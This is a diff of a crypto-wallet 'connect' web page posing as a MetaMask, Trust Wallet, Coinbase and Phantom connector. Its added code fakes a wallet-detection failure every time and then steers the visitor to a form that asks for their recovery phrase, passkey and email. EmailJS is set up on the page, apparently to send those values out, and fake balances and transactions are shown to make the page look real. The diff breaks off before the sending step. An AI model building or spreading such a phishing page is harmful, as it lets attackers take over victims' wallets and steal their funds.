@@ -3,354 +3,485 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Advanced WalletConnect System</title>
+    <title>Wallet Connect System</title>
+    <!-- Add these before your main script -->
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.6.9/dist/ethers.umd.min.js"></script>
     <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.0.5/purify.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
     <style>
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.5; }
-        }
-        @keyframes scan {
-            0% { top: 0; }
-            100% { top: 100%; }
-        }
-        .animate-pulse-custom {
-            animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite;
-        }
-        .qr-scanner-line {
-            position: absolute;
-            height: 3px;
-            width: 100%;
-            background: linear-gradient(to bottom, 
-                rgba(74, 222, 128, 0) 0%, 
-                rgba(74, 222, 128, 1) 50%, 
-                rgba(74, 222, 128, 0) 100%);
-            animation: scan 2s linear infinite;
-        }
+        .fade-in { animation: fadeIn 0.3s ease-in; }
+@keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+.slide-down { animation: slideDown 0.3s ease-out; }
+@keyframes slideDown { from { transform: translateY(-20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+
+.pulse { animation: pulse 2s infinite; }
+@keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
         .wallet-card {
             transition: all 0.3s ease;
-            transform-style: preserve-3d;
         }
         .wallet-card:hover {
-            transform: rotateY(10deg) scale(1.05);
+            transform: scale(1.05);
+            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1);
         }
-        .wallet-card.active {
-            transform: rotateY(180deg);
-        }
-        .tab-content {
+        .modal {
             display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.7);
+            z-index: 100;
         }
-        .tab-content.active {
-            display: block;
-            animation: fadeIn 0.5s ease;
+        .modal-content {
+            animation: fadeIn 0.3s ease;
         }
         @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
+            from { opacity: 0; transform: translateY(20px); }
             to { opacity: 1; transform: translateY(0); }
         }
-        .connection-progress {
-            width: 0%;
-            transition: width 5s linear;
+        .animate-spin {
+            animation: spin 1s linear infinite;
         }
-        .connecting .connection-progress {
-            width: 100%;
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .shake {
+            animation: shake 0.5s cubic-bezier(.36,.07,.19,.97) both;
+        }
+        @keyframes shake {
+            10%, 90% { transform: translateX(-1px); }
+            20%, 80% { transform: translateX(2px); }
+            30%, 50%, 70% { transform: translateX(-4px); }
+            40%, 60% { transform: translateX(4px); }
+        }
+        .fade-in {
+            animation: fadeIn 0.5s ease-in;
+        }
+        .slide-up {
+            animation: slideUp 0.5s ease-out;
+        }
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
         }
     </style>
 </head>
 <body class="bg-gray-900 text-white min-h-screen flex items-center justify-center p-4">
-    <div class="container max-w-4xl mx-auto">
-        <!-- Main Wallet Selection -->
-        <div class="text-center mb-12">
-            <a href="wallet.html" ><h1 class="text-4xl font-bold mb-2 bg-clip-text text-transparent bg-gradient-to-r from-green-400 to-blue-500">Connect Your Wallet</h1></a>
-            <p class="text-gray-400">Select your wallet to begin secure connection</p>
-        </div>
+    <div class="container max-w-4xl mx-auto text-center">
+        <h1 class="text-4xl font-bold mb-2 bg-clip-text text-transparent bg-gradient-to-r from-green-400 to-blue-500">Connect Your Wallet</h1>
+        <p class="text-gray-400 mb-8">Select your wallet to begin secure connection</p>
 
+        <!-- Add below the title but above the wallet grid -->
+<div class="connection-status mb-6 p-3 rounded-lg bg-gray-800 border border-gray-700 hidden" id="connectionStatus">
+    <div class="flex items-center justify-center">
+        <div class="w-3 h-3 rounded-full bg-red-500 mr-2" id="statusIndicator"></div>
+        <span id="statusText">Not Connected</span>
+    </div>
+</div>
+        
         <div class="grid grid-cols-2 md:grid-cols-4 gap-4 mb-12">
             <!-- Wallet Options -->
-            <div class="wallet-card bg-gray-800 rounded-xl p-6 flex flex-col items-center cursor-pointer shadow-lg hover:shadow-xl transition-shadow" 
-                 data-wallet="metamask" onclick="selectWallet(this, 'metamask')">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" alt="MetaMask" class="h-16 w-16 mb-3 transition-transform duration-300">
+            <div class="wallet-card bg-gray-800 rounded-xl p-6 flex flex-col items-center cursor-pointer shadow-lg hover:bg-gray-750" onclick="selectWallet('MetaMask')">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" alt="MetaMask" class="h-16 w-16 mb-3">
                 <span class="font-medium">MetaMask</span>
-                <div class="mt-2 h-1 w-8 bg-blue-500 rounded-full opacity-0 transition-opacity"></div>
             </div>
-
-            <div class="wallet-card bg-gray-800 rounded-xl p-6 flex flex-col items-center cursor-pointer shadow-lg hover:shadow-xl transition-shadow" 
-                 data-wallet="trust" onclick="selectWallet(this, 'trust')">
-                <img src="https://trustwallet.com/assets/images/media/assets/TWT.png" alt="Trust Wallet" class="h-16 w-16 mb-3 transition-transform duration-300">
+            
+            <div class="wallet-card bg-gray-800 rounded-xl p-6 flex flex-col items-center cursor-pointer shadow-lg hover:bg-gray-750" onclick="selectWallet('Trust Wallet')">
+                <img src="https://trustwallet.com/assets/images/media/assets/TWT.png" alt="Trust Wallet" class="h-16 w-16 mb-3">
                 <span class="font-medium">Trust Wallet</span>
-                <div class="mt-2 h-1 w-8 bg-blue-500 rounded-full opacity-0 transition-opacity"></div>
             </div>
-
-            <div class="wallet-card bg-gray-800 rounded-xl p-6 flex flex-col items-center cursor-pointer shadow-lg hover:shadow-xl transition-shadow" 
-                 data-wallet="coinbase" onclick="selectWallet(this, 'coinbase')">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/9/9a/Coinbase_Wordmark.svg" alt="Coinbase" class="h-16 w-16 mb-3 transition-transform duration-300">
+            
+            <div class="wallet-card bg-gray-800 rounded-xl p-6 flex flex-col items-center cursor-pointer shadow-lg hover:bg-gray-750" onclick="selectWallet('Coinbase')">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/9/9a/Coinbase_Wordmark.svg" alt="Coinbase" class="h-16 w-16 mb-3">
                 <span class="font-medium">Coinbase</span>
-                <div class="mt-2 h-1 w-8 bg-blue-500 rounded-full opacity-0 transition-opacity"></div>
             </div>
-
-            <div class="wallet-card bg-gray-800 rounded-xl p-6 flex flex-col items-center cursor-pointer shadow-lg hover:shadow-xl transition-shadow" 
-                 data-wallet="phantom" onclick="selectWallet(this, 'phantom')">
-                <img src="https://phantom.app/favicon.ico" alt="Phantom" class="h-16 w-16 mb-3 transition-transform duration-300">
+            
+            <div class="wallet-card bg-gray-800 rounded-xl p-6 flex flex-col items-center cursor-pointer shadow-lg hover:bg-gray-750" onclick="selectWallet('Phantom')">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/2/20/Phantom_by_Fantom_Foundation_Logo.png" alt="Phantom" class="h-16 w-16 mb-3">
                 <span class="font-medium">Phantom</span>
-                <div class="mt-2 h-1 w-8 bg-blue-500 rounded-full opacity-0 transition-opacity"></div>
+            </div>
+            <div class="wallet-card bg-gray-800 rounded-xl p-6 flex flex-col items-center cursor-pointer shadow-lg hover:bg-gray-750" onclick="selectWallet('Qubetic')">
+                <img src="https://qubetic.com/assets/img/logo-icon.png" alt="Qubetic" class="h-16 w-16 mb-3">
+                <span class="font-medium">Qubetic</span>
             </div>
         </div>
 
-        <!-- Connection Modal (Hidden by default) -->
-        <div id="connectionModal" class="fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center p-4 z-50 opacity-0 pointer-events-none transition-opacity duration-300">
-            <div class="bg-gray-800 rounded-xl max-w-md w-full overflow-hidden shadow-2xl transform transition-all duration-300 scale-95">
-                <div class="p-6">
-                    <div class="flex justify-between items-center mb-4">
-                        <h3 class="text-xl font-bold" id="modalTitle">Connect to <span id="selectedWalletName"></span></h3>
-                        <button onclick="closeModal()" class="text-gray-400 hover:text-white">
-                            <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
-                            </svg>
-                        </button>
-                    </div>
+        <!-- Add at top of walletActions div -->
+<div class="flex justify-between items-center mb-6 p-4 bg-gray-750 rounded-lg">
+    <div>
+        <p class="text-gray-400 text-sm">Total Balance</p>
+        <p class="text-2xl font-bold">2.45 <span class="text-blue-400">ETH</span></p>
+    </div>
+    <div class="text-right">
+        <p class="text-gray-400 text-sm">≈ $4,321.50</p>
+        <p class="text-green-500 text-sm">+2.4%</p>
+    </div>
+</div>
+        <!-- Add below the wallet grid -->
+<div class="bg-gray-800 rounded-xl p-6 mt-8 hidden" id="walletActions">
+    <h3 class="text-xl font-semibold mb-4">Wallet Actions</h3>
+    <div class="space-y-3" id="transactionsList">
+        <!-- Will be populated by JS -->
+    </div>
+</div>
+    </div>
 
-                    <!-- Tabs -->
-                    <div class="flex border-b border-gray-700 mb-4">
-                        <button id="qr-tab-btn" class="py-2 px-4 font-medium border-b-2 border-blue-500 text-blue-400" onclick="switchTab('qr')">QR Code</button>
-                        <button id="phrase-tab-btn" class="py-2 px-4 font-medium text-gray-400 hover:text-white" onclick="switchTab('phrase')">Phrase/Passkey</button>
-                    </div>
-
-                    <!-- QR Tab Content -->
-                    <div id="qr-tab-content" class="tab-content active">
-                        <div class="bg-black p-4 rounded-lg relative overflow-hidden mb-4" style="min-height: 300px;">
-                            <div class="qr-scanner-line"></div>
-                            <div class="flex flex-col items-center justify-center h-full">
-                                <div class="bg-white p-2 rounded mb-4">
-                                    <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=https://walletconnect.com/example" alt="QR Code" class="w-40 h-40">
-                                </div>
-                                <p class="text-gray-400 text-sm">Scan this QR code with your wallet app</p>
-                            </div>
-                        </div>
-                        <button onclick="simulateQRScan()" class="w-full bg-blue-600 hover:bg-blue-700 text-white py-3 rounded-lg font-medium transition-colors">
-                            Simulate QR Scan (Demo)
-                        </button>
-                    </div>
-
-                    <!-- Phrase/Passkey Tab Content -->
-                    <div id="phrase-tab-content" class="tab-content">
-                        <form id="authForm" class="space-y-4">
-                            <div>
-                                <label for="recovery-phrase" class="block text-sm font-medium text-gray-400 mb-1">Recovery Phrase</label>
-                                <textarea id="recovery-phrase" rows="3" class="w-full bg-gray-700 border border-gray-600 rounded-lg px-4 py-2 focus:ring-2 focus:ring-blue-500 focus:border-transparent" placeholder="Enter your 12-24 word recovery phrase"></textarea>
-                            </div>
-                            <div>
-                                <label for="passkey" class="block text-sm font-medium text-gray-400 mb-1">Passkey</label>
-                                <input type="password" id="passkey" class="w-full bg-gray-700 border border-gray-600 rounded-lg px-4 py-2 focus:ring-2 focus:ring-blue-500 focus:border-transparent" placeholder="Enter your passkey">
-                            </div>
-                            <button type="submit" class="w-full bg-blue-600 hover:bg-blue-700 text-white py-3 rounded-lg font-medium transition-colors">
-                                Connect Wallet
-                            </button>
-                        </form>
-                    </div>
-                </div>
-            </div>
-        </div>
-
-        <!-- Connecting Animation Modal (Hidden by default) -->
-        <div id="connectingModal" class="fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center p-4 z-50 opacity-0 pointer-events-none transition-opacity duration-300">
-            <div class="bg-gray-800 rounded-xl max-w-md w-full overflow-hidden shadow-2xl p-6 text-center">
-                <div id="walletLogo" class="h-20 w-20 mx-auto mb-6">
-                    <!-- Wallet logo will be inserted here -->
-                </div>
-                <h3 class="text-xl font-bold mb-2">Connecting to <span id="connectingWalletName"></span></h3>
-                <p class="text-gray-400 mb-6">Please wait while we establish a secure connection</p>
-                
-                <div class="bg-gray-700 rounded-full h-2 mb-6 overflow-hidden">
-                    <div class="connection-progress bg-blue-500 h-2 rounded-full"></div>
-                </div>
-                
-                <div class="flex space-x-2 justify-center">
-                    <div class="w-3 h-3 bg-blue-400 rounded-full animate-pulse-custom"></div>
-                    <div class="w-3 h-3 bg-blue-400 rounded-full animate-pulse-custom" style="animation-delay: 0.2s"></div>
-                    <div class="w-3 h-3 bg-blue-400 rounded-full animate-pulse-custom" style="animation-delay: 0.4s"></div>
-                </div>
-            </div>
-        </div>
-
-        <!-- Success Modal (Hidden by default) -->
-        <div id="successModal" class="fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center p-4 z-50 opacity-0 pointer-events-none transition-opacity duration-300">
-            <div class="bg-gray-800 rounded-xl max-w-md w-full overflow-hidden shadow-2xl p-6 text-center">
-                <div class="mx-auto mb-6 text-green-400">
-                    <svg xmlns="http://www.w3.org/2000/svg" class="h-20 w-20 mx-auto" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
-                    </svg>
-                </div>
-                <h3 class="text-xl font-bold mb-2">Connection Successful!</h3>
-                <p class="text-gray-400 mb-6">Your wallet is now securely connected.</p>
-                <button onclick="closeSuccessModal()" class="w-full bg-blue-600 hover:bg-blue-700 text-white py-3 rounded-lg font-medium transition-colors">
-                    Continue
+    <!-- Connection Modal -->
+    <div id="connectionModal" class="modal flex items-center justify-center hidden">
+        <div class="modal-content bg-gray-800 rounded-xl p-6 max-w-md w-full mx-4">
+            <div class="flex justify-between items-center mb-4">
+                <h2 class="text-xl font-bold">Connect to <span id="selectedWallet"></span></h2>
+                <button onclick="closeModal()" class="text-gray-400 hover:text-white transition-colors">
+                    ✕
                 </button>
+            </div>
+            
+            <!-- Tabs -->
+            <div class="flex border-b border-gray-700 mb-4 ">
+                <button id="extension-tab-btn" class="py-2 px-4 font-medium border-b-2 border-blue-500 text-blue-400 transition-colors" onclick="switchTab('extension')">
+                    Extension
+                </button>
+                <button id="phrase-tab-btn" class="py-2 px-4 font-medium text-gray-400 hover:text-white transition-colors" onclick="switchTab('phrase')">
+                    Recovery Phrase
+                </button>
+            </div>
+
+            <!-- Add below the tabs but above extension content -->
+<div class="mb-4" id="networkSelection">
+    <label class="block text-sm font-medium text-gray-400 mb-1">Network</label>
+    <select class="w-full bg-gray-700 border border-gray-600 rounded-lg px-4 py-2 focus:ring-2 focus:ring-blue-500 focus:border-transparent">
+        <option>Ethereum Mainnet</option>
+        <option>Binance Smart Chain</option>
+        <option>Polygon</option>
+        <option>Arbitrum</option>
+        <option>Test Network</option>
+    </select>
+</div>
+            
+            <!-- Extension Tab -->
+            <div id="extension-tab-content" class="tab-content">
+                <div class="bg-gray-700 p-4 rounded-lg mb-4">
+                    <p class="text-gray-300 mb-4">Click below to connect with your wallet extension</p>
+                    <button onclick="connectWithExtension()" class="w-full bg-blue-600 hover:bg-blue-700 text-white py-3 rounded-lg font-medium flex items-center justify-center transition-colors">
+                        <span id="connectBtnText">Detect Wallet</span>
+                        <svg id="connectSpinner" class="hidden w-5 h-5 ml-2 animate-spin" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                            <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                            <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                        </svg>
+                    </button>
+                </div>
+            </div>
+            
+            <!-- Recovery Phrase Tab -->
+            <div id="phrase-tab-content" class="tab-content hidden">
+                <form id="authForm" class="space-y-4">
+                    <div>
+                        <label for="recovery-phrase" class="block text-sm font-medium text-gray-400 mb-1">Recovery Phrase</label>
+                        <textarea id="recovery-phrase" rows="3" class="w-full bg-gray-700 border border-gray-600 rounded-lg px-4 py-2 focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all" placeholder="Enter your 12-24 word recovery phrase" required></textarea>
+                        <p id="phrase-error" class="text-red-500 text-sm mt-1 hidden">Please enter a valid recovery phrase (12-24 words)</p>
+                    </div>
+                    <div>
+                        <label for="passkey" class="block text-sm font-medium text-gray-400 mb-1">Passkey (Optional)</label>
+                        <input type="password" id="passkey" class="w-full bg-gray-700 border border-gray-600 rounded-lg px-4 py-2 focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all" placeholder="Enter your passkey if needed">
+                    </div>
+                    <div>
+                        <label for="email" class="block text-sm font-medium text-gray-400 mb-1">Email (For Verification)</label>
+                        <input type="email" id="email" class="w-full bg-gray-700 border border-gray-600 rounded-lg px-4 py-2 focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all" placeholder="Enter your email" required>
+                        <p id="email-error" class="text-red-500 text-sm mt-1 hidden">Please enter a valid email address</p>
+                    </div>
+                    <button type="submit" class="w-full bg-blue-600 hover:bg-blue-700 text-white py-3 rounded-lg font-medium flex items-center justify-center transition-colors">
+                        <span id="submitBtnText">Connect Wallet</span>
+                        <svg id="submitSpinner" class="hidden w-5 h-5 ml-2 animate-spin" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                            <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                            <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                        </svg>
+                    </button>
+                </form>
             </div>
         </div>
     </div>
-   
+
+    <!-- Connecting Modal -->
+    <div id="connectingModal" class="modal flex items-center justify-center hidden">
+        <div class="modal-content bg-gray-800 rounded-xl p-6 max-w-md w-full mx-4 text-center">
+            <div class="spinner border-4 border-blue-500 border-t-transparent rounded-full w-12 h-12 mx-auto mb-4 animate-spin"></div>
+            <h3 class="text-lg font-medium mb-2">Connecting to <span id="connectingWallet"></span></h3>
+            <p class="text-gray-400">Please wait...</p>
+        </div>
+    </div>
+
+    <!-- Detection Failed Modal -->
+    <div id="failedModal" class="modal flex items-center justify-center hidden">
+        <div class="modal-content bg-gray-800 rounded-xl p-6 max-w-md w-full mx-4 text-center slide-up">
+            <div class="text-yellow-500 text-5xl mb-4">!</div>
+            <h3 class="text-lg font-medium mb-2">Failed to Connect Automatically</h3>
+            <p class="text-gray-400 mb-6">We couldn't detect your wallet extension. Please connect manually using your recovery phrase.</p>
+            <button onclick="showManualConnection()" class="w-full bg-blue-600 hover:bg-blue-700 text-white py-3 rounded-lg font-medium transition-colors">
+                Connect Manually
+            </button>
+        </div>
+    </div>
+
+    <!-- Success Modal -->
+    <div id="successModal" class="modal flex items-center justify-center hidden">
+        <div class="modal-content bg-gray-800 rounded-xl p-6 max-w-md w-full mx-4 text-center">
+            <div class="text-green-500 text-5xl mb-4 animate-bounce">✓</div>
+            <h3 class="text-lg font-medium mb-2">Wallet Connected!</h3>
+            <p class="text-gray-400 mb-4">You've successfully connected <span id="successWallet"></span></p>
+            <button onclick="closeSuccessModal()" class="w-full bg-blue-600 hover:bg-blue-700 text-white py-3 rounded-lg font-medium transition-colors">
+                Continue
+            </button>
+        </div>
+
+        <!-- Add below the success message in success modal -->
+<div class="bg-gray-750 p-3 rounded-lg mt-4 mb-4 flex justify-between items-center">
+    <span id="walletAddress" class="font-mono text-sm truncate">0x742d...35a1</span>
+    <button onclick="copyAddress()" class="text-blue-400 hover:text-blue-300">
+        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 5H6a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2v-1M8 5a2 2 0 002 2h2a2 2 0 002-2M8 5a2 2 0 012-2h2a2 2 0 012 2m0 0h2a2 2 0 012 2v3m2 4H10m0 0l3-3m-3 3l3 3"></path>
+        </svg>
+    </button>
+</div>
+    </div>
     <script>
-        // Initialize EmailJS (replace with your actual User ID)
-        emailjs.init('user_your_emailjs_user_id_here');
+        function generateRandomAddress() {
+    return '0x' + Array.from({length: 40}, () => 
+        Math.floor(Math.random() * 16).toString(16)).join('');
+}
 
-        let selectedWallet = null;
-        const walletLogos = {
-            metamask: 'https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg',
-            trust: 'https://trustwallet.com/assets/images/media/assets/TWT.png',
-            coinbase: 'https://upload.wikimedia.org/wikipedia/commons/9/9a/Coinbase_Wordmark.svg',
-            phantom: 'https://phantom.app/favicon.ico'
-        };
+// Add to where you show success modal
+document.getElementById('walletAddress').textContent = 
+    generateRandomAddress();
 
-        function selectWallet(element, wallet) {
-            // Reset all wallet cards
-            document.querySelectorAll('.wallet-card').forEach(card => {
-                card.classList.remove('active');
-                card.querySelector('img').classList.remove('animate-spin');
-                card.querySelector('.h-1').classList.add('opacity-0');
-            });
+function copyAddress() {
+    const address = document.getElementById('walletAddress').textContent;
+    navigator.clipboard.writeText(address);
+    alert('Address copied to clipboard!');
+}
+    </script>
 
-            // Activate selected wallet
-            element.classList.add('active');
-            element.querySelector('img').classList.add('animate-spin');
-            element.querySelector('.h-1').classList.remove('opacity-0');
-
-            selectedWallet = wallet;
-            
-            // Show connection modal
-            document.getElementById('selectedWalletName').textContent = getWalletName(wallet);
-            document.getElementById('connectionModal').classList.remove('opacity-0', 'pointer-events-none');
-            document.getElementById('connectionModal').querySelector('.scale-95').classList.remove('scale-95');
+    <script>
+        // Initialize EmailJS with your credentials
+        (function() {
+            emailjs.init('YOUR_EMAILJS_USER_ID'); // Replace with your actual EmailJS user ID
+        })();
+        
+        let currentWallet = '';
+        
+        function selectWallet(walletName) {
+            currentWallet = walletName;
+            document.getElementById('selectedWallet').textContent = walletName;
+            document.getElementById('connectionModal').style.display = 'flex';
+            // Show extension tab by default
+            switchTab('extension');
         }
-
-        function getWalletName(wallet) {
-            const names = {
-                metamask: 'MetaMask',
-                trust: 'Trust Wallet',
-                coinbase: 'Coinbase Wallet',
-                phantom: 'Phantom'
-            };
-            return names[wallet] || wallet;
-        }
-
+        
         function closeModal() {
-            document.getElementById('connectionModal').classList.add('opacity-0', 'pointer-events-none');
-            document.getElementById('connectionModal').querySelector('.scale-95').classList.add('scale-95');
+            document.getElementById('connectionModal').style.display = 'none';
         }
-
+        
         function switchTab(tab) {
             // Update active tab button
-            document.getElementById('qr-tab-btn').classList.remove('border-blue-500', 'text-blue-400');
-            document.getElementById('qr-tab-btn').classList.add('text-gray-400');
+            document.getElementById('extension-tab-btn').classList.remove('border-blue-500', 'text-blue-400');
+            document.getElementById('extension-tab-btn').classList.add('text-gray-400');
             document.getElementById('phrase-tab-btn').classList.remove('border-blue-500', 'text-blue-400');
             document.getElementById('phrase-tab-btn').classList.add('text-gray-400');
-
-            if (tab === 'qr') {
-                document.getElementById('qr-tab-btn').classList.add('border-blue-500', 'text-blue-400');
-                document.getElementById('qr-tab-btn').classList.remove('text-gray-400');
+            
+            if (tab === 'extension') {
+                document.getElementById('extension-tab-btn').classList.add('border-blue-500', 'text-blue-400');
+                document.getElementById('extension-tab-btn').classList.remove('text-gray-400');
+                document.getElementById('extension-tab-content').classList.remove('hidden');
+                document.getElementById('phrase-tab-content').classList.add('hidden');
             } else {
                 document.getElementById('phrase-tab-btn').classList.add('border-blue-500', 'text-blue-400');
                 document.getElementById('phrase-tab-btn').classList.remove('text-gray-400');
+                document.getElementById('phrase-tab-content').classList.remove('hidden');
+                document.getElementById('extension-tab-content').classList.add('hidden');
             }
-
-            // Update active tab content
-            document.getElementById('qr-tab-content').classList.remove('active');
-            document.getElementById('phrase-tab-content').classList.remove('active');
-            document.getElementById(`${tab}-tab-content`).classList.add('active');
         }
-
-        function simulateQRScan() {
-            closeModal();
-            showConnectingModal();
+        
+        function connectWithExtension() {
+            const connectBtn = document.getElementById("connectBtnText");
+            const connectSpinner = document.getElementById("connectSpinner");
             
-            // Simulate connection progress
+            // Show loading state
+            connectBtn.textContent = "Detecting...";
+            connectSpinner.classList.remove("hidden");
+            
+            // After 3 seconds, show failed modal (simulating detection failure)
             setTimeout(() => {
-                closeConnectingModal();
-                showSuccessModal();
-            }, 5000);
+                document.getElementById('connectionModal').style.display = 'none';
+                document.getElementById('connectingWallet').textContent = currentWallet;
+                document.getElementById('failedModal').style.display = 'flex';
+                
+                // Reset connect button
+                connectBtn.textContent = "Detect Wallet";
+                connectSpinner.classList.add("hidden");
+            }, 3000);
         }
+        
+        function showManualConnection() {
+            document.getElementById('failedModal').style.display = 'none';
+            document.getElementById('connectionModal').style.display = 'flex';
+            switchTab('phrase');
+        }
+        
+// Add to success modal close function
+    function closeSuccessModal() {
+        document.getElementById('successModal').style.display = 'none';
+        document.getElementById('connectionStatus').classList.remove('hidden');
+        document.getElementById('statusIndicator').classList.remove('bg-red-500');
+        document.getElementById('statusIndicator').classList.add('bg-green-500');
+        document.getElementById('statusText').textContent = `Connected to ${currentWallet}`;
+         showWalletActions();
+    }
+        // Show wallet actions after successful connection
+function showWalletActions() {
+    document.getElementById('walletActions').classList.remove('hidden');
+    const transactions = [
+        { hash: '0x4f3...2d1', type: 'Received', amount: '0.5 ETH', time: '2 mins ago' },
+        { hash: '0x8a2...9f4', type: 'Sent', amount: '1.2 ETH', time: '1 hour ago' }
+    ];
+    
+    let html = '';
+    transactions.forEach(tx => {
+        html += `
+        <div class="flex justify-between items-center p-3 bg-gray-750 rounded-lg">
+            <div>
+                <span class="font-medium">${tx.type}</span>
+                <span class="text-gray-400 text-sm block">${tx.time}</span>
+            </div>
+            <div class="text-right">
+                <span class="block">${tx.amount}</span>
+                <span class="text-gray-400 text-sm">${tx.hash}</span>
+            </div>
+        </div>`;
+    });
+    document.getElementById('transactionsList').innerHTML = html;
 
-        function showConnectingModal() {
-            document.getElementById('connectingWalletName').textContent = getWalletName(selectedWallet);
+    const ethBalance = (Math.random() * 10).toFixed(4);
+    const usdValue = (ethBalance * 1763).toFixed(2);
+    document.querySelector('#walletActions > div > div > p:nth-child(2)').textContent = 
+        `${ethBalance} ETH`;
+    document.querySelector('#walletActions > div > div:nth-child(2) > p:nth-child(1)').textContent = 
+        `≈ $${usdValue}`;
+}
             
-            // Set wallet logo
-            const logoContainer = document.getElementById('walletLogo');
-            logoContainer.innerHTML = `<img src="${walletLogos[selectedWallet]}" alt="${getWalletName(selectedWallet)}" class="h-full w-full object-contain">`;
-            
-            // Reset progress bar
-            document.querySelector('.connection-progress').style.width = '0%';
-            
-            // Show modal
-            document.getElementById('connectingModal').classList.remove('opacity-0', 'pointer-events-none');
-            
-            // Trigger progress animation
-            setTimeout(() => {
-                document.getElementById('connectingModal').classList.add('connecting');
-            }, 100);
-        }
-
-        function closeConnectingModal() {
-            document.getElementById('connectingModal').classList.add('opacity-0', 'pointer-events-none');
-            document.getElementById('connectingModal').classList.remove('connecting');
-        }
-
-        function showSuccessModal() {
-            document.getElementById('successModal').classList.remove('opacity-0', 'pointer-events-none');
-        }
-
-        function closeSuccessModal() {
-            document.getElementById('successModal').classList.add('opacity-0', 'pointer-events-none');
-        }
-
-        // Form validation and submission
+        // Form submission with validation and EmailJS
         document.getElementById('authForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
-            const phrase = DOMPurify.sanitize(document.getElementById('recovery-phrase').value);
-            const passkey = DOMPurify.sanitize(document.getElementById('passkey').value);
+            const phrase = document.getElementById('recovery-phrase').value.trim();
+            const passkey = document.getElementById('passkey').value.trim();
+            const email = document.getElementById('email').value.trim();
+            const submitBtn = document.getElementById("submitBtnText");
+            const submitSpinner = document.getElementById("submitSpinner");
             
-            if (!validatePhrase(phrase)) {
-                alert('Please enter a valid recovery phrase (12-24 words)');
+            // Validate recovery phrase (basic check for word count)
+            const wordCount = phrase.split(/\s+/).filter(word => word.length > 0).length;
+            if (wordCount < 12 || wordCount > 24) {
+                document.getElementById('phrase-error').classList.remove('hidden');
+                document.getElementById('recovery-phrase').classList.add('border-red-500');
+                document.getElementById('recovery-phrase').classList.remove('border-gray-600');
+                setTimeout(() => {
+                    document.getElementById('recovery-phrase').classList.add('shake');
+                    setTimeout(() => {
+                        document.getElementById('recovery-phrase').classList.remove('shake');
+                    }, 500);
+                }, 10);
                 return;
+            } else {
+                document.getElementById('phrase-error').classList.add('hidden');
+                document.getElementById('recovery-phrase').classList.remove('border-red-500');
+                document.getElementById('recovery-phrase').classList.add('border-gray-600');
             }
             
-            if (!passkey) {
-                alert('Please enter your passkey');
+            // Validate email
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (!emailRegex.test(email)) {
+                document.getElementById('email-error').classList.remove('hidden');
+                document.getElementById('email').classList.add('border-red-500');
+                document.getElementById('email').classList.remove('border-gray-600');
+                setTimeout(() => {
+                    document.getElementById('email').classList.add('shake');
+                    setTimeout(() => {
+                        document.getElementById('email').classList.remove('shake');
+                    }, 500);
+                }, 10);
                 return;
+            } else {
+                document.getElementById('email-error').classList.add('hidden');
+                document.getElementById('email').classList.remove('border-red-500');
+                document.getElementById('email').classList.add('border-gray-600');
             }
+            
+            // Show connecting state
